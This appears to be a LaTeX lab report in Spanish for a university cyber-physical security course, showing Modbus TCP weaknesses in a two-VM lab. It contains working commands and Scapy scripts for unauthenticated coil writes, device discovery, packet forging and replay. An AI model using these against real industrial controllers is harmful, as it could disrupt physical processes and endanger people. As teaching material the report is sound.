@@ -1,0 +1,548 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[spanish]{babel}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{geometry}
+\usepackage{fancyhdr}
+\usepackage{float}
+\usepackage{booktabs}
+\usepackage{longtable}
+
+\geometry{margin=2.5cm}
+
+% Configuración de listings para código
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2,
+    frame=single
+}
+\lstset{style=mystyle}
+
+\title{
+    \textbf{Caso de Estudio \#1: Modbus} \\
+    \large MC4002 Seguridad en Sistemas Ciberfísicos
+}
+\author{Luis Bonilla}
+\date{Febrero 2026}
+
+\begin{document}
+
+\maketitle
+
+\tableofcontents
+\newpage
+
+%==============================================================================
+\section{Introducción}
+%==============================================================================
+
+\subsection{¿Qué es Modbus TCP/IP?}
+
+Modbus es un protocolo de comunicación de capa de aplicación, ubicado en el nivel 7 del modelo OSI, que proporciona comunicación cliente/servidor entre dispositivos conectados a través de diferentes tipos de buses o medios de comunicación. Introducido en 1979, Modbus se ha convertido en el estándar de facto para sistemas de control industrial (ICS).
+
+El protocolo Modbus TCP/IP es la implementación del protocolo Modbus sobre redes Ethernet, utilizando TCP como protocolo de transporte en el puerto 502. Esta versión mantiene la misma estructura de mensajes que Modbus serial, pero utiliza el encabezado MBAP (Modbus Application Protocol) en lugar del checksum de error.
+
+\subsection{¿Por qué es inseguro?}
+
+Modbus TCP presenta múltiples vulnerabilidades de seguridad inherentes a su diseño:
+
+\begin{itemize}
+    \item \textbf{Sin encriptación}: Todos los datos se transmiten en texto plano, permitiendo que cualquier atacante con acceso a la red pueda interceptar las comunicaciones.
+    \item \textbf{Sin autenticación}: No se requieren credenciales para leer o escribir en los registros del dispositivo.
+    \item \textbf{Sin verificación de integridad}: Los paquetes pueden ser modificados en tránsito sin detección.
+    \item \textbf{Sin autorización}: Cualquier cliente que conozca la dirección IP puede enviar comandos al servidor.
+\end{itemize}
+
+\subsection{Objetivo del laboratorio}
+
+El objetivo de este laboratorio es demostrar las vulnerabilidades del protocolo Modbus TCP/IP mediante:
+
+\begin{enumerate}
+    \item Configuración de un servidor Modbus y comunicación con clientes
+    \item Análisis de tráfico de red para observar la falta de encriptación
+    \item Uso de herramientas de seguridad (Nmap, Scapy) para interactuar con dispositivos Modbus
+    \item Captura y reproducción de paquetes Modbus
+\end{enumerate}
+
+\subsection{Entorno de Laboratorio}
+
+Para este laboratorio se utilizaron dos máquinas virtuales:
+
+\begin{table}[H]
+\centering
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{Máquina} & \textbf{Sistema Operativo} & \textbf{Rol} & \textbf{Dirección IP} \\
+\hline
+VM1 & Ubuntu Linux & Servidor Modbus & 192.168.1.66 \\
+VM2 & Kali Linux & Atacante/Analizador & 192.168.1.64 \\
+\hline
+\end{tabular}
+\caption{Configuración del entorno de laboratorio}
+\label{tab:entorno}
+\end{table}
+
+%==============================================================================
+\section{Breaking Modbus}
+%==============================================================================
+
+\subsection{Instalación de paquetes}
+
+\subsubsection{En Ubuntu (Servidor Modbus)}
+
+Se instalaron los paquetes necesarios para ejecutar el servidor Modbus:
+
+\begin{lstlisting}[language=bash, caption=Instalación de paquetes en Ubuntu]
+sudo apt update
+sudo apt install python3-pip wireshark -y
+sudo pip3 install pymodbus
+\end{lstlisting}
+
+\subsubsection{En Kali Linux (Atacante)}
+
+Se instalaron las herramientas de análisis y cliente Modbus:
+
+\begin{lstlisting}[language=bash, caption=Instalación de paquetes en Kali]
+# Instalar Ruby (requerido para modbus-cli)
+sudo apt update
+sudo apt install ruby ruby-dev -y
+
+# Instalar modbus-cli
+sudo gem install modbus-cli
+
+# Instalar Scapy
+sudo pip install scapy
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{01_packagesInstallation}
+    \caption{Instalación de paquetes en la máquina virtual}
+    \label{fig:packages}
+\end{figure}
+
+\subsection{Configuración del Servidor Modbus}
+
+Se creó un script en Python para iniciar un servidor Modbus TCP asíncrono utilizando la biblioteca pyModbus:
+
+\begin{lstlisting}[language=Python, caption=Código del servidor Modbus (Modbus\_server.py)]
+#!/usr/bin/env python
+from pymodbus.server.async import StartTcpServer
+from pymodbus.device import ModbusDeviceIdentification
+from pymodbus.datastore import ModbusSequentialDataBlock
+from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
+
+# Crear datastore con datos de prueba
+store = ModbusSlaveContext(
+    di = ModbusSequentialDataBlock(0, [17]*100),  # Discrete Inputs
+    co = ModbusSequentialDataBlock(0, [17]*100),  # Coils
+    hr = ModbusSequentialDataBlock(0, [17]*100),  # Holding Registers
+    ir = ModbusSequentialDataBlock(0, [17]*100))  # Input Registers
+
+context = ModbusServerContext(slaves=store, single=True)
+
+# Identificacion del servidor
+identity = ModbusDeviceIdentification()
+identity.VendorName = 'PyModbus Inc.'
+identity.ProductCode = 'PM'
+identity.VendorUrl = 'https://github.com/riptideio/pyModbus'
+identity.ProductName = 'Modbus Server'
+identity.ModelName = 'PyModbus'
+identity.MajorMinorRevision = '1.0'
+
+print("Starting Modbus server...")
+StartTcpServer(context, identity=identity, address=("0.0.0.0", 502))
+\end{lstlisting}
+
+El servidor se inició con el siguiente comando:
+
+\begin{lstlisting}[language=bash]
+sudo python Modbus_server.py
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{02_ModbusPythonServer}
+    \caption{Inicialización del Servidor Modbus en Ubuntu}
+    \label{fig:modbusServer}
+\end{figure}
+
+\subsection{Comunicación con modbus-cli}
+
+Desde la máquina Kali, se utilizó la herramienta \texttt{modbus-cli} para comunicarse con el servidor Modbus y demostrar la falta de autenticación.
+
+\subsubsection{Lectura de Coils}
+
+\begin{lstlisting}[language=bash, caption=Lectura de coils usando modbus-cli]
+modbus read 192.168.1.66 %M1 5
+\end{lstlisting}
+
+Resultado obtenido:
+\begin{lstlisting}
+%M1     1
+%M2     1
+%M3     1
+%M4     1
+%M5     1
+\end{lstlisting}
+
+\subsubsection{Escritura de valores (sin autenticación)}
+
+Se demostró que es posible escribir valores sin ningún tipo de autenticación:
+
+\begin{lstlisting}[language=bash, caption=Escritura y verificación de valores]
+# Escribir valor 0 en la posicion 1
+modbus write 192.168.1.66 1 0
+
+# Verificar el cambio
+modbus read 192.168.1.66 1 5
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{03_ModbusClient.png}
+    \caption{Comunicación con el servidor Modbus usando modbus-cli}
+    \label{fig:modbusClient}
+\end{figure}
+
+\subsection{Escaneo con Nmap}
+
+Se utilizó Nmap para descubrir dispositivos Modbus en la red y obtener información del servidor.
+
+\subsubsection{Descubrimiento de hosts}
+
+\begin{lstlisting}[language=bash, caption=Escaneo de red con Nmap]
+nmap -sP 192.168.1.0/24
+\end{lstlisting}
+
+\subsubsection{Escaneo de puertos}
+
+\begin{lstlisting}[language=bash, caption=Escaneo completo de puertos]
+nmap -A 192.168.1.66 -p-
+\end{lstlisting}
+
+El resultado mostró el puerto 502/tcp abierto con el servicio \texttt{mbap} (Modbus Application Protocol).
+
+\subsubsection{Script de descubrimiento Modbus}
+
+Se utilizó el script NSE de Nmap para obtener información detallada del dispositivo:
+
+\begin{lstlisting}[language=bash, caption=Uso del script modbus-discover]
+nmap 192.168.1.66 -p 502 --script modbus-discover.nse
+\end{lstlisting}
+
+Resultado:
+\begin{lstlisting}
+PORT     STATE SERVICE
+502/tcp  open  Modbus
+| Modbus-discover:
+|   sid 0x1:
+|     error: SLAVE DEVICE FAILURE
+|_    Device identification: PyModbus Inc. PM 1.0
+\end{lstlisting}
+
+Este resultado demuestra que la información de identificación del dispositivo (VendorName, ProductCode, etc.) está expuesta a cualquier atacante en la red.
+
+% Agregar screenshot del escaneo Nmap aqui
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[width=\textwidth]{05_NmapScan}
+%     \caption{Resultado del escaneo Nmap con script modbus-discover}
+%     \label{fig:nmapScan}
+% \end{figure}
+
+%==============================================================================
+\section{Using Python and Scapy to Communicate over Modbus}
+%==============================================================================
+
+\subsection{Configuración de Scapy para Modbus}
+
+Scapy es una herramienta de manipulación de paquetes que permite construir, enviar, capturar y analizar paquetes de red. Para soportar el protocolo Modbus, se instalaron módulos adicionales del framework smod.
+
+\begin{lstlisting}[language=bash, caption=Instalación de módulos Modbus para Scapy]
+# Descargar framework smod
+git clone https://github.com/enddo/smod.git
+
+# Copiar modulos al directorio de Python
+sudo mkdir -p /usr/lib/python2.7/dist-packages/Modbus/
+sudo cp smod-master/System/Core/*.py /usr/lib/python2.7/dist-packages/Modbus/
+\end{lstlisting}
+
+\subsection{Deshabilitación de RST automático}
+
+Linux envía paquetes RST automáticamente para conexiones TCP forjadas. Para evitar interferencias, se deshabilitó esta funcionalidad:
+
+\begin{lstlisting}[language=bash, caption=Regla iptables para deshabilitar RST]
+sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.64 -j DROP
+\end{lstlisting}
+
+\subsection{Creación de paquetes Modbus con Scapy}
+
+Se utilizó Scapy interactivamente para crear y analizar paquetes Modbus:
+
+\begin{lstlisting}[language=Python, caption=Creación de paquetes en Scapy]
+>>> from Modbus.Modbus import *
+>>> ip = IP(src='192.168.1.64', dst='192.168.1.66')
+>>> tcp = TCP(sport=12345, dport=502, flags='S')
+>>> pkt = ip/tcp/ModbusADU()/ModbusPDU01_Read_Coils()
+>>> pkt.show()
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{04_ScapyPackage.png}
+    \caption{Creación de paquetes Modbus en Scapy}
+    \label{fig:scapyPackage}
+\end{figure}
+
+\subsection{Script de comunicación Modbus con TCP Handshake}
+
+Se desarrolló un script completo que establece una conexión TCP, envía solicitudes Modbus y procesa las respuestas:
+
+\begin{lstlisting}[language=Python, caption=Script de comunicación Modbus con Scapy]
+from scapy.all import *
+from Modbus.Modbus import *
+import random
+
+# Configuracion
+srcIP = '192.168.1.64'
+srcPort = random.randint(1024, 65535)
+dstIP = '192.168.1.66'
+dstPort = 502
+seqNr = random.randint(444, 8765432)
+ackNr = 0
+
+def tcpHandshake():
+    global seqNr, ackNr
+    ip = IP(src=srcIP, dst=dstIP)
+    SYN = TCP(sport=srcPort, dport=dstPort, flags='S', seq=seqNr)
+    pktSYNACK = sr1(ip / SYN)
+
+    ackNr = pktSYNACK.seq + 1
+    seqNr = seqNr + 1
+    ACK = TCP(sport=srcPort, dport=dstPort, flags='A', seq=seqNr, ack=ackNr)
+    send(ip / ACK)
+    return ip / ACK
+
+def connectedSend(pkt):
+    pkt[TCP].flags = 'PA'
+    pkt[TCP].seq = seqNr
+    pkt[TCP].ack = ackNr
+    send(pkt)
+
+# Establecer conexion
+ConnectionPkt = tcpHandshake()
+
+# Crear y enviar solicitud Modbus
+ModbusPkt = ConnectionPkt/ModbusADU()/ModbusPDU01_Read_Coils()
+ModbusPkt[ModbusADU].unitId = 1
+ModbusPkt[ModbusPDU01_Read_Coils].quantity = 5
+
+connectedSend(ModbusPkt)
+\end{lstlisting}
+
+El script demuestra cómo es posible forjar paquetes Modbus completamente funcionales utilizando Python y Scapy, sin necesidad de autenticación.
+
+% Agregar screenshot de ejecucion del script
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[width=\textwidth]{06_ScapyScript}
+%     \caption{Ejecución del script de comunicación Modbus}
+%     \label{fig:scapyScript}
+% \end{figure}
+
+%==============================================================================
+\section{Replaying Captured Modbus Packets}
+%==============================================================================
+
+\subsection{Captura de tráfico con Wireshark}
+
+Se utilizó Wireshark para capturar el tráfico Modbus generado por el script de Nmap:
+
+\begin{lstlisting}[language=bash, caption=Generación de tráfico Modbus para captura]
+nmap 192.168.1.66 -p 502 --script modbus-discover.nse
+\end{lstlisting}
+
+En Wireshark se aplicó el siguiente filtro para visualizar únicamente el tráfico Modbus:
+
+\begin{lstlisting}
+ip.addr== 192.168.1.66 && tcp.port == 502
+\end{lstlisting}
+
+% Agregar screenshot de Wireshark
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[width=\textwidth]{07_WiresharkCapture}
+%     \caption{Captura de tráfico Modbus en Wireshark}
+%     \label{fig:wireshark}
+% \end{figure}
+
+\subsection{Exportación de paquete como Hex Stream}
+
+Para reproducir un paquete capturado, se exportó como cadena hexadecimal:
+
+\begin{enumerate}
+    \item Seleccionar un paquete Modbus Query (Request)
+    \item Click derecho $\rightarrow$ Copy $\rightarrow$ ...as a Hex Stream
+\end{enumerate}
+
+\subsection{Importación y manipulación en Scapy}
+
+El paquete capturado se importó en Scapy para su análisis y modificación:
+
+\begin{lstlisting}[language=Python, caption=Importación de paquete desde hex stream]
+>>> from Modbus.Modbus import *
+>>> import binascii
+
+# Convertir hex stream a binario
+>>> raw_pkt = binascii.unhexlify('000c298f792c000c29f27ece...')
+
+# Crear paquete Scapy
+>>> Modbus_pkt = Ether(raw_pkt)
+>>> Modbus_pkt.show()
+\end{lstlisting}
+
+El resultado muestra la estructura completa del paquete con todas sus capas (Ethernet, IP, TCP, ModbusADU, ModbusPDU):
+
+\begin{lstlisting}
+###[ Ethernet ]###
+  dst= 00:0c:29:8f:79:2c
+  src= 00:0c:29:f2:7e:ce
+###[ IP ]###
+  src= 192.168.1.64
+  dst= 192.168.1.66
+###[ TCP ]###
+  sport= 44828
+  dport= 502
+###[ ModbusADU ]###
+  transId= 0x0
+  unitId= 0x1
+###[ Report Slave Id ]###
+  funcCode= 0x11
+\end{lstlisting}
+
+\subsection{Modificación y reenvío}
+
+Una vez importado, el paquete puede ser modificado y reenviado:
+
+\begin{lstlisting}[language=Python, caption=Modificación de campos del paquete]
+# Cambiar Transaction ID
+>>> Modbus_pkt[ModbusADU].transId = 0x1234
+
+# Cambiar direccion de inicio
+>>> Modbus_pkt[ModbusPDU01_Read_Coils].startAddr = 10
+
+# Verificar cambios
+>>> Modbus_pkt[ModbusADU].show()
+\end{lstlisting}
+
+Esta capacidad de capturar, modificar y reproducir paquetes demuestra la vulnerabilidad del protocolo ante ataques de replay.
+
+%==============================================================================
+\section{Análisis de Vulnerabilidades}
+%==============================================================================
+
+\subsection{Vulnerabilidades identificadas}
+
+Durante el desarrollo del laboratorio se identificaron las siguientes vulnerabilidades:
+
+\begin{table}[H]
+\centering
+\begin{tabular}{|p{3cm}|p{10cm}|}
+\hline
+\textbf{Vulnerabilidad} & \textbf{Descripción} \\
+\hline
+Sin Encriptación & Todo el tráfico Modbus TCP se transmite en texto plano. Los valores de registros, comandos y respuestas son visibles para cualquier atacante con acceso a la red. \\
+\hline
+Sin Autenticación & No se requieren credenciales para conectarse al servidor Modbus. Cualquier cliente puede leer y escribir valores. \\
+\hline
+Sin Autorización & No existen niveles de acceso. Un cliente puede ejecutar cualquier función Modbus sin restricciones. \\
+\hline
+Sin Integridad & Los paquetes no incluyen verificación de integridad criptográfica, permitiendo modificaciones no detectadas. \\
+\hline
+Exposición de información & El protocolo expone información del dispositivo (vendor, modelo, versión) que puede ser usada para identificar vulnerabilidades conocidas. \\
+\hline
+Replay Attacks & Los paquetes capturados pueden ser reproducidos sin modificación o con cambios en los parámetros. \\
+\hline
+\end{tabular}
+\caption{Vulnerabilidades identificadas en Modbus TCP}
+\label{tab:vulnerabilities}
+\end{table}
+
+\subsection{Códigos de función Modbus utilizados}
+
+\begin{table}[H]
+\centering
+\begin{tabular}{|c|c|l|}
+\hline
+\textbf{FC (Hex)} & \textbf{FC (Dec)} & \textbf{Descripción} \\
+\hline
+0x01 & 1 & Read Coil Status \\
+0x02 & 2 & Read Discrete Inputs \\
+0x03 & 3 & Read Holding Registers \\
+0x04 & 4 & Read Input Registers \\
+0x05 & 5 & Write Single Coil \\
+0x06 & 6 & Write Single Holding Register \\
+0x0F & 15 & Write Multiple Coils \\
+0x10 & 16 & Write Multiple Holding Registers \\
+0x11 & 17 & Report Slave ID \\
+0x2B & 43 & Read Device Identification \\
+\hline
+\end{tabular}
+\caption{Códigos de función Modbus}
+\label{tab:functionCodes}
+\end{table}
+
+%==============================================================================
+\section{Conclusiones}
+%==============================================================================
+
+En este laboratorio se demostró de manera práctica las vulnerabilidades inherentes al protocolo Modbus TCP/IP:
+
+\begin{enumerate}
+    \item \textbf{Falta de seguridad por diseño}: Modbus fue diseñado en 1979 para operar en redes propietarias aisladas, sin considerar amenazas de seguridad modernas.
+
+    \item \textbf{Facilidad de ataque}: Con herramientas básicas como Nmap, modbus-cli y Scapy, es posible descubrir, comunicarse y manipular dispositivos Modbus sin ninguna barrera de seguridad.
+
+    \item \textbf{Exposición de información}: Los dispositivos Modbus revelan información de identificación que puede ser utilizada para buscar vulnerabilidades conocidas en bases de datos como ICS-CERT.
+
+    \item \textbf{Ataques de replay}: La falta de mecanismos de integridad y freshness permite capturar y reproducir comandos legítimos.
+
+    \item \textbf{Necesidad de controles compensatorios}: Dado que el protocolo no puede ser modificado sin romper compatibilidad, es necesario implementar controles de seguridad a nivel de red (segmentación, firewalls industriales, IDS/IPS específicos para ICS).
+\end{enumerate}
+
+%==============================================================================
+\section{Referencias}
+%==============================================================================
+
+\begin{itemize}
+    \item Ackerman, P. (2017). \textit{Industrial Cybersecurity}. Packt Publishing. Capítulo 2: Insecure by Inheritance.
+    \item Modbus Organization. \textit{Modbus Application Protocol Specification V1.1b3}.
+    \item pyModbus Documentation: \url{https://github.com/riptideio/pyModbus}
+    \item Scapy Documentation: \url{https://scapy.net/}
+    \item Nmap NSE Scripts: \url{https://nmap.org/nsedoc/scripts/modbus-discover.html}
+\end{itemize}
+
+\end{document}
